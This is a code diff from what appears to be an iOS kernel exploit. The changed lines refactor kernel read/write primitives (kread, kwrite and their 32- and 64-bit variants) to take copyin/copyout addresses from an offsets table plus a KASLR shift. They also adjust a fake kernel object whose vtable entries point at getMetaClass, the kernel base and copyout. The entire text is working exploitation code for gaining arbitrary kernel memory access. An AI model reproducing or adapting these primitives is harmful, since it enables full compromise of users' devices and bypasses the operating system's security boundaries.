@@ -92,14 +92,6 @@ kern_return_t mach_vm_deallocate
  mach_vm_size_t size
  );
 
-struct ool_msg  {
-    mach_msg_header_t hdr;
-    mach_msg_body_t body;
-    mach_msg_ool_ports_descriptor_t ool_ports;
-};
-
-
-
 mach_port_t prealloc_port(int size) {
     kern_return_t err;
     mach_port_qos_t qos = {0};
@@ -275,7 +267,7 @@ static void _kx_find()
     r_obj[8] = get_metaclass;           // vtable + 0x38 (::getMetaClass)
     
     r_obj[9] = kernel_base;
-    r_obj[10] = (uint64_t)&feedfacf;
+    r_obj[10] = &feedfacf;
     r_obj[11] = copyout;
     
     memmove((uint8_t *)r_obj + 0x10, r_obj, sizeof(r_obj) - 0x10);
@@ -367,13 +359,13 @@ void kx3(uint64_t fptr, uint64_t arg0, uint64_t arg1, uint64_t arg2) {
 
 void kread(uint64_t addr, uint8_t *userspace, int n)
 {
-    uint64_t copyout = 0xfffffff0071f5280 + _kaslr_shift;
+    uint64_t copyout = offsets.copyout + _kaslr_shift;
     kx3(copyout, addr, (uint64_t)userspace, n);
 }
 
 uint32_t kread32(uint64_t addr)
 {
-    uint64_t copyout = 0xfffffff0071f5280 + _kaslr_shift;
+    uint64_t copyout = offsets.copyout + _kaslr_shift;
     uint32_t value = 0;
     kx3(copyout, addr, (uint64_t)&value, sizeof(value));
     
@@ -382,27 +374,27 @@ uint32_t kread32(uint64_t addr)
 
 uint64_t kread64(uint64_t addr)
 {
-    uint64_t copyout = 0xfffffff0071f5280 + _kaslr_shift;
+    uint64_t copyout = offsets.copyout + _kaslr_shift;
     uint64_t value = 0;
-    kx3(copyout, addr, (uint64_t)&value, sizeof(value));
+    kx3(copyout, addr, &value, sizeof(value));
     
     return value;
 }
 
 void kwrite(uint64_t addr, uint8_t *userspace, int n)
 {
-    uint64_t copyin = 0xfffffff0071f5058 + _kaslr_shift;
-    kx3(copyin, (uint64_t)userspace, addr, n);
+    uint64_t copyin = offsets.copyin + _kaslr_shift;
+    kx3(copyin, userspace, addr, n);
 }
 
 void kwrite32(uint64_t addr, uint32_t value)
 {
-    uint64_t copyin = 0xfffffff0071f5058 + _kaslr_shift;
-    kx3(copyin, (uint64_t)&value, addr, sizeof(value));
+    uint64_t copyin = offsets.copyin + _kaslr_shift;
+    kx3(copyin, &value, addr, sizeof(value));
 }
 
 void kwrite64(uint64_t addr, uint64_t value)
 {
-    uint64_t copyin = 0xfffffff0071f5058 + _kaslr_shift;
+    uint64_t copyin = offsets.copyin + _kaslr_shift;
     kx3(copyin, (uint64_t)&value, addr, sizeof(value));
 }
